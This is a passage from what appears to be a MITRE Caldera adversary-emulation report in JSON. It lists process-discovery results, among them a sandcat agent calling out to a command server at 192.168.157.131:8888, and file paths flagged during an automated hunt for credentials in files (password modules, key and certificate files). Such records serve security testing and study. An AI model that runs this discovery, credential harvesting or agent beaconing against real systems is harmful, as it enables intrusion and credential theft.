-prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/firefox-esr/firefox-esr -contentproc -childID 4 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/firefox-esr/firefox-esr -contentproc -childID 5 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/firefox-esr/firefox-esr -contentproc -childID 5 -isForBrowser -prefsLen 31163 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/usr/lib/firefox-esr/firefox-esr -contentproc -childID 6 -isForBrowser -prefsLen 34089 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/firefox-esr/firefox-esr -contentproc -childID 6 -isForBrowser -prefsLen 34089 -prefMapSize 249178 -jsInitLen 234912 -parentBuildID 20250517152055 -greomni /usr/lib/firefox-esr/omni.ja","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/0   Sl+  02:33   0:00 ./sandcat -server http://192.168.157.131:8888","trait":"host.file.path","name":"host.file.path","value":"/0   Sl+  02:33   0:00 ./sandcat -server http://192.168.157.131:8888","created":"2026-05-14T10:32:31Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["b66b5338-4f82-4cb1-b916-af9c39be63f5"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1057"},{"unique":"host.file.path/boot/grub/i386-pc/password.mod","trait":"host.file.path","name":"host.file.path","value":"/boot/grub/i386-pc/password.mod","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/boot/grub/i386-pc/legacy_password_test.mod","trait":"host.file.path","name":"host.file.path","value":"/boot/grub/i386-pc/legacy_password_test.mod","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/boot/grub/i386-pc/password_pbkdf2.mod","trait":"host.file.path","name":"host.file.path","value":"/boot/grub/i386-pc/password_pbkdf2.mod","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/google_aosp.pem","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/google_aosp.pem","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/oracle_java.pem","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/oracle_java.pem","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/apple.pem","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/apple.pem","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/microsoft_windows.pem","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/microsoft_windows.pem","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/mozilla_nss.pem","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/mozilla_nss.pem","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/openjdk.pem","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/sslyze/plugins/certificate_info/trust_stores/pem_files/openjdk.pem","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/tornado/test/test.key","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/tornado/test/test.key","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/pip/_vendor/certifi/cacert.pem","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/pip/_vendor/certifi/cacert.pem","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/samba/netcmd/domain/__pycache__/passwordsettings.cpython-313.pyc","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/samba/netcmd/domain/__pycache__/passwordsettings.cpython-313.pyc","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/samba/netcmd/domain/passwordsettings.py","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/samba/netcmd/domain/passwordsettings.py","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/samba/netcmd/user/password.py","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/samba/netcmd/user/password.py","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/__pycache__/getpassword.cpython-313.pyc","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/__pycache__/getpassword.cpython-313.pyc","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/__pycache__/syncpasswords.cpython-313.pyc","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/__pycache__/syncpasswords.cpython-313.pyc","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/getpassword.py","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/getpassword.py","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"},{"unique":"host.file.path/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/syncpasswords.py","trait":"host.file.path","name":"host.file.path","value":"/usr/lib/python3/dist-packages/samba/netcmd/user/readpasswords/syncpasswords.py","created":"2026-05-14T10:35:46Z","score":1,"source":"b9c6c556-e7ed-42d0-a72d-10c80b6032b1","origin_type":"LEARNED","links":["cdc71df3-f707-44c4-80b2-35c0177354e8"],"relationships":[],"limit_count":-1,"collected_by":["maivbp"],"technique_id":"T1552.001"}],"skipped_abilities":[{"maivbp":[]}]}